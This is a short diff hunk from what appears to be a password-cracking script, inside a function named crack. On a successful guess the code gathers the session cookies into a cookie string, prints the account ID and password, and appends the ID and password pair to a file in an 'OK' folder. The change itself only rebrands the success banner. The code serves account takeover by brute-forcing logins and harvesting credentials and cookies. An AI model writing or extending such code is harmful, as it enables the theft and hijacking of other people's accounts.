@@ -404,7 +404,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{h}\033[1;92m𝚁𝚄𝚂𝚂𝙸-𝙾𝙺 𝙔𝙀𝘼𝙍 : {tahun(idf)}  {idf} | {pw} ☯︎𒊹︎︎𝚊𝚙𝚙☯︎𒊹︎︎︎ ☟︎︎︎  \033[1;92m')
+				print(f'\r{h}\033[1;92mHAWA-OK 𝙔𝙀𝘼𝙍 : {tahun(idf)}  {idf} | {pw}   \033[1;92m')
 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				break
